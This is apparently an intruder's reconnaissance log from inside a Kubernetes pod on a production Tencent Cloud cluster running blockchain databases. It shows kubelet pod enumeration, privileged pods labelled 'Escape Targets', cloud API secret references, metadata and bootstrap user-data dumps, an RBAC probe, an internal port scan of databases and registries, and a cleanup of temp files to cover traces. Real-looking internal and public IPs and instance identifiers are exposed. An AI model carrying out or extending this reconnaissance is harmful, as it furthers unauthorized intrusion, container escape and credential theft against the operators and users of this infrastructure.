# JOURNEY LOG Part 3 — Perl HTTP Recon
## Date: Fri Feb 27 02:16:13 AM UTC 2026

=== STEP A: KUBELET API — All pods on this node ===
(Using Perl HTTP::Tiny — curl not available on pod)
Saved 282202 bytes to /tmp/.pods.json

=== STEP B: ALL PODS — namespace/name/status ===
POD                                                     NAMESPACE       STATUS
-------------------------------------------------------------------------------------
loki-stack-promtail-lskwz                               api             Running
bncs20-db-c8bcbbf4d-mzxmw                               bncs-20         Running
commission-polkadot-db-0                                commission      Running
commission-kusama-db-0                                  commission      Running
kubernetes-proxy-8596bcbb7c-k668h                       default         Running
tke-bridge-agent-kbb82                                  kube-system     Running
kube-proxy-mxp5k                                        kube-system     Running
coredns-8ff5bcd7c-dcsmb                                 kube-system     Running
tke-log-agent-vbl6d                                     kube-system     Running
ip-masq-agent-vffkt                                     kube-system     Running
tke-cni-agent-rrjdp                                     kube-system     Running
cls-provisioner-6bdc598b58-8975t                        kube-system     Running
csi-cbs-node-42zsf                                      kube-system     Running
tke-monitor-agent-c7kg5                                 kube-system     Running
csi-provisioner-cfsplugin-0                             kube-system     Running
csi-nodeplugin-cfsplugin-2zdcb                          kube-system     Running
monitor-polkadot-db-76bbc686cd-dz5w4                    monitor3        Running
monitor-bifrost-kusama-db-5dbc8b6c78-8fl75              monitor3        Running
bifrost-tvl-subql-db-6ccdcc468c-95459                   monitor3        Running
monitor-bifrost-polkadot-db-8676d958b6-zbgmr            monitor3        Running
blackbox-exporter-78c6f6c54-c8hr5                       monitoring      Running
node-exporter-gc9g8                                     monitoring      Running
kube-state-metrics-c9f8b947b-p4569                      monitoring      Running
prometheus-k8s-0                                        monitoring      Running
prometheus-adapter-669fd5d4f8-m8q2l                     monitoring      Running
server-vmanta-bind-db-6bb5656dff-mhg4k                  rainbow         Running
rainbow6-airdrop-subql-6578dbc766-75r2n                 rainbow         Running
bifrost-polkadot-db-55d4bb4d55-7xqrc                    slp-squid       Running
vpha-db-6574f79db9-w95rj                                slp-squid       Running
evm-db-5d7d5454fb-mkz9n                                 slp-squid       Running
monitor-other-chains-db-db84f5844-d9bjx                 slp-squid       Running
bifrost-kusama-db-74dfd8f6bc-6gx4m                      slp-squid       Running
bifrost-subql-db-7d7b8bcbfd-j4rwz                       subql-v2        Running
task-tracker-db-0                                       task-tracker    Running
postgres-polkadot-bnc-788558b4d6-x9dkr                  test-db         Running
veth-monitor-68b45f8b65-qlr7j                           test-db         Running
postgres-zhejiang-7c979f6588-xtklp                      test-db         Running
postgres-monitor3-test-7c4ff69699-whmwd                 test-db         Running
postgres-veth2-68d7966758-p22t5                         test-db         Running
hyperbridge1-db-0                                       veth3           Running
hyperbridge2-db-0                                       veth3           Running
hyperbridge3-db-0                                       veth3           Running

Total: 42 pods

=== STEP C: PRIVILEGED PODS — The Escape Targets ===

=== tke-bridge-agent-kbb82 ===
  Namespace:    kube-system
  SA:           tke-bridge-agent
  Privileged:   YES
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /opt/cni/bin, /etc/cni/net.d, /lib/modules, /var/run, /var/lib/cni/networks/tke-bridge

=== kube-proxy-mxp5k ===
  Namespace:    kube-system
  SA:           kube-proxy
  Privileged:   YES
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /etc/localtime, /run/xtables.lock, /lib/modules

=== node-exporter-gc9g8 ===
  Namespace:    monitoring
  SA:           node-exporter
  Privileged:   .
  HostNetwork:  YES
  HostPID:      YES
  HostPaths:    /sys, /

=== tke-log-agent-vbl6d ===
  Namespace:    kube-system
  SA:           tke-log-agent
  Privileged:   YES
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /etc/localtime, /var/log/tke-log-agent, /, /usr/local/loglistener/data, /var/log/containers, /var/log/pods, /var/run, /etc/docker, /run/containerd, /var/lib/kubelet, /usr/local/kafkalistener/etc

=== ip-masq-agent-vffkt ===
  Namespace:    kube-system
  SA:           default
  Privileged:   YES
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /etc/localtime, /lib/modules

=== tke-cni-agent-rrjdp ===
  Namespace:    kube-system
  SA:           tke-cni
  Privileged:   .
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /opt/cni/bin, /etc/cni/net.d, /etc/kubernetes

=== cls-provisioner-6bdc598b58-8975t ===
  Namespace:    kube-system
  SA:           cls-provisioner
  Privileged:   .
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /etc/localtime, /var/run, /run/containerd

=== csi-cbs-node-42zsf ===
  Namespace:    kube-system
  SA:           cbs-csi-node-sa
  Privileged:   YES
  HostNetwork:  YES
  HostPID:      YES
  HostPaths:    /var/lib/kubelet/plugins/com.tencent.cloud.csi.cbs, /var/lib/kubelet/plugins_registry/, /var/lib/kubelet/plugins, /var/lib/kubelet/pods, /dev, /sys, /lib/modules

=== tke-monitor-agent-c7kg5 ===
  Namespace:    kube-system
  SA:           tke-monitor-agent
  Privileged:   YES
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /etc/localtime, /, /proc

=== csi-nodeplugin-cfsplugin-2zdcb ===
  Namespace:    kube-system
  SA:           csi-cfs-tencentcloud
  Privileged:   YES
  HostNetwork:  YES
  HostPID:      .
  HostPaths:    /var/lib/kubelet/plugins/com.tencent.cloud.csi.cfs, /var/lib/kubelet/pods, /var/lib/kubelet/plugins_registry

=== STEP D: tke-log-agent FULL DETAIL ===
Pod: tke-log-agent-vbl6d
Namespace: kube-system
ServiceAccount: tke-log-agent
HostNetwork: YES
NodeName: 172.19.0.35

Container: log-agent
  Image: hkccr.ccs.tencentyun.com/tkeimages/log-agent:v1.1.6
  Privileged: YES
  VolumeMount: tz -> /etc/localtime
  VolumeMount: log-agent-root -> /var/log/tke-log-agent
  VolumeMount: host-root -> /rootfs
  VolumeMount: loglistener-etc -> /usr/local/loglistener/etc
  VolumeMount: var-log-contaienrs -> /var/log/containers
  VolumeMount: var-log-pods -> /var/log/pods
  VolumeMount: docker-conf -> /etc/docker
  VolumeMount: docker-host -> /var/run
  VolumeMount: containerd-state -> /run/containerd
  VolumeMount: kubelet-root -> /var/lib/kubelet
  VolumeMount: kafkalistener-etc -> /usr/local/kafkalistener/etc
  VolumeMount: kube-api-access-ls4kc -> /var/run/secrets/kubernetes.io/serviceaccount

Container: loglistener
  Image: hkccr.ccs.tencentyun.com/tkeimages/loglistener:v2.8.1
  Privileged: YES
  VolumeMount: tz -> /etc/localtime
  VolumeMount: log-agent-root -> /var/log/tke-log-agent
  VolumeMount: host-root -> /rootfs
  VolumeMount: loglistener-etc -> /usr/local/loglistener/etc
  VolumeMount: loglistener-data -> /usr/local/loglistener/data
  VolumeMount: var-log-contaienrs -> /var/log/containers
  VolumeMount: var-log-pods -> /var/log/pods
  VolumeMount: containerd-state -> /run/containerd
  VolumeMount: kubelet-root -> /var/lib/kubelet
  VolumeMount: kube-api-access-ls4kc -> /var/run/secrets/kubernetes.io/serviceaccount

Container: kafkalistener
  Image: hkccr.ccs.tencentyun.com/tkeimages/kafkalistener:v1.0.8.7
  Privileged: YES
  VolumeMount: tz -> /etc/localtime
  VolumeMount: host-root -> /rootfs
  VolumeMount: kafkalistener-etc -> /usr/local/services/fluent-bit/etc
  VolumeMount: log-agent-root -> /var/log/tke-log-agent
  VolumeMount: var-log-contaienrs -> /var/log/containers
  VolumeMount: var-log-pods -> /var/log/pods
  VolumeMount: containerd-state -> /run/containerd
  VolumeMount: kubelet-root -> /var/lib/kubelet
  VolumeMount: kube-api-access-ls4kc -> /var/run/secrets/kubernetes.io/serviceaccount

Volumes:
  hostPath: tz -> /etc/localtime
  hostPath: log-agent-root -> /var/log/tke-log-agent
  hostPath: host-root -> /
  hostPath: loglistener-data -> /usr/local/loglistener/data
  hostPath: var-log-contaienrs -> /var/log/containers
  hostPath: var-log-pods -> /var/log/pods
  hostPath: docker-host -> /var/run
  hostPath: docker-conf -> /etc/docker
  hostPath: containerd-state -> /run/containerd
  hostPath: kubelet-root -> /var/lib/kubelet
  hostPath: kafkalistener-etc -> /usr/local/kafkalistener/etc

=== STEP E: KUBE-SYSTEM SECRETS REFERENCES ===
Secret references in kube-system pods:

  csi-cbs-node-42zsf                            env-secret: cbs-csi-api-key (key=TENCENTCLOUD_CBS_API_SECRET_ID)
  csi-cbs-node-42zsf                            env-secret: cbs-csi-api-key (key=TENCENTCLOUD_CBS_API_SECRET_KEY)
  csi-provisioner-cfsplugin-0                   env-secret: cfs-csi-api-key (key=TENCENTCLOUD_CFS_API_SECRET_ID)
  csi-provisioner-cfsplugin-0                   env-secret: cfs-csi-api-key (key=TENCENTCLOUD_CFS_API_SECRET_KEY)

=== STEP F: TENCENT CLOUD METADATA ===
instance-id               = ins-lhhnlf42
instance-name             = tke-正式环境
placement/region          = ap-hongkong
placement/zone            = ap-hongkong-2
public-ipv4               = 43.154.29.23
local-ipv4                = 172.19.0.35
mac                       = 52:54:00:46:c0:ee
uuid                      = 52b0c4ae-879f-42ac-b30c-3df9d577c08c

--- Security credentials ---
No IAM role / 404

=== STEP G: CLOUD USER-DATA (TKE bootstrap) ===
#!/bin/bash

debug_log(){
        local debug_log_file="/tmp/ccs_userdata_exec.log"
    dt=`date`
    echo "INFO [$dt]" "$*" | tee -a "${debug_log_file}"
}
debug_log begin exec userdata
debug_log cloud-init static installer

architecture=$(arch)
config_file="/etc/ccs/ccs.config"
mkdir -p /etc/ccs/
cat > ${config_file} << EOF
CCS_ADD_CLUSTER=false
EOF

systemctl stop systemd-resolved
if [ "$(uname -r)" == "5.4.0-90-generic" ];then
        systemctl stop named
        if [ $? -ne 0 ];then
                echo stop named failed
        else
                echo success stop named
        fi
fi
domains=(
static.ccs.tencentyun.com
)
for domain in ${domains[@]}
do
    nslookup $domain > /dev/null
    if [ $? -ne 0 ]; then
        echo "need re-config dns-resolver"
        if [ ! -f "/etc/resolv.conf" ]; then
            echo "/etc/resolv.conf not exist"
            rm -f /etc/resolv.conf
        fi
        sed -i '$a \nameserver 183.60.83.19' /etc/resolv.conf
        sed -i '$a \nameserver 183.60.82.98' /etc/resolv.conf
        break
    fi
done

nslookup agentserver.ccs.tencentyun.com > /dev/null
if [ $? -ne 0 ];then
    sed -i '$a\169.254.0.119 agentserver.ccs.tencentyun.com' /etc/hosts
    sed -i '$a\169.254.0.59 static.ccs.tencentyun.com' /etc/hosts
    sed -i '$a\169.254.0.23 metadata.tencentyun.com' /etc/hosts
fi

if nvidia-smi >/dev/null 2>&1; then
  echo "the instance is pre-installed nvidia driver in OS."
elif [ $? == 14 ];then
  debug_log [cloud-init] GPU InfoRom error
else

driver_version=NVIDIA-Linux-x86_64-450.102.04.run;if [[ "$(lspci -d 10de:)" =~ "2236" ]] ;then driver_version=NVIDIA-Linux-x86_64-470.82.01.run; fi;
debug_log [cloud-init] select default nvidia driver version 450
nvidia_devices=$(lspci -d 10de:)
os_alias=`cat /etc/os-release | grep ^PRETTY_NAME= | cut -f2 -d= | sed 's/\"//g'`
if [ -n "$nvidia_devices" ] && [ "$os_alias" != "TencentOS Server 3.1 (Final)" ]; then
	while true
	do
        wget -nv http://static.ccs.tencentyun.com/nv_driver_insta
... (2879 bytes total)

=== STEP H: K8S API — Version + RBAC ===
--- K8s API Version ---
IO::Socket::SSL 1.42 must be installed for https support
Net::SSLeay 1.49 must be installed for https support


--- RBAC Check ---
list secrets              -> 599
list pods                 -> 599
list namespaces           -> 599
list nodes                -> 599
list configmaps           -> 599
create pods               -> 599
list clusterroles         -> 599

=== STEP I: NETWORK — Reachability via Perl ===
172.19.48.10        :22    Jenkins SSH               closed
172.19.48.10        :8080  Jenkins HTTP              closed
172.19.48.10        :9100  Jenkins node-exporter     closed
172.19.64.14        :80    Harbor HTTP               OPEN
172.19.64.14        :443   Harbor HTTPS              closed
172.19.0.45         :9615  Collator HK Kusama        closed
172.19.64.34        :9615  Collator HK Polkadot      closed
172.19.64.39        :8080  Substrate API Sidecar     OPEN
172.19.0.11         :15432 Airdrop DB                OPEN
172.19.64.16        :25432 Archive DB                OPEN
172.21.0.1          :10255 Kubelet readonly          OPEN
172.21.0.1          :10250 Kubelet HTTPS             OPEN

=== STEP J: HARBOR — Public projects ===
[{"chart_count":0,"creation_time":"2023-05-16T02:10:45.893Z","current_user_role_ids":null,"cve_allowlist":{"creation_time":"0001-01-01T00:00:00.000Z","id":22,"items":[],"project_id":15,"update_time":"0001-01-01T00:00:00.000Z"},"metadata":{"auto_scan":"false","enable_content_trust":"false","prevent_vul":"false","public":"true","reuse_sys_cve_allowlist":"true","severity":"low"},"name":"commission","owner_id":1,"owner_name":"admin","project_id":15,"repo_count":1,"update_time":"2023-05-16T02:10:45.893Z"},{"chart_count":0,"creation_time":"2025-10-17T19:01:19.159Z","current_user_role_ids":null,"cve_allowlist":{"creation_time":"0001-01-01T00:00:00.000Z","id":32,"items":[],"project_id":23,"update_time":"0001-01-01T00:00:00.000Z"},"metadata":{"public":"true"},"name":"service","owner_id":1,"owner_name":"admin","project_id":23,"repo_count":0,"update_time":"2025-10-17T19:01:19.159Z"},{"chart_count":0,"creation_time":"2023-07-27T01:59:47.671Z","current_user_role_ids":null,"cve_allowlist":{"creation_time":"0001-01-01T00:00:00.000Z","id":25,"items":[],"project_id":16,"update_time":"0001-01-01T00:00:00.000Z"},"metadata":{"public":"true"},"name":"slp-squid","owner_id":1,"owner_name":"admin","project_id":16,"repo_count":8,"update_time":"2023-07-27T01:59:47.671Z"},{"chart_count":0,"creation_time":"2022-08-09T13:35:29.616Z","current_user_role_ids":null,"cve_allowlist":{"creation_time":"0001-01-01T00:00:00.000Z","id":3,"items":[],"project_id":3,"update_time":"0001-01-01T00:00:00.000Z"},"metadata":{"auto_scan":"false","enable_content_trust":"false","prevent_vul":"false","public":"true","reuse_sys_cve_allowlist":"true","severity":"low"},"name":"test","owner_id":1,"owner_name":"admin","project_id":3,"repo_count":7,"update_time":"2022-08-09T13:35:29.616Z"},{"chart_count":0,"creation_time":"2023-03-07T08:42:35.921Z","current_user_role_ids":null,"cve_allowlist":{"creation_time":"0001-01-01T00:00:00.000Z","id":21,"items":[],"project_id":14,"update_time":"0001-01-01T00:00:00.000Z"},"metadata":{"public":"true"},"name":"vfil","owner_id":1,"owner_name":"admin","project_id":14,"repo_count":0,"update_time":"2023-03-07T08:42:35.921Z"}]

=== STEP K: SUBSTRATE SIDECAR — Transaction endpoint ===
--- /transaction/material ---
Status: 200
{"at":{"hash":"0xb45684a6fd2aa255ab3816f50928bb65873ceb62e0d66855a12eaa4819e4448b","height":"11290593"},"genesisHash":"0x262e1b2ad728475fd6fe88e62d34c200abe6fd693931ddad144059b1eb884e5b","chainName":"Bifrost Polkadot","specName":"bifrost_polkadot","specVersion":"23002","txVersion":"1"}

--- /pallets/system/storage/account ---
Status: 500

=== CLEANUP ===
Temp files cleaned.
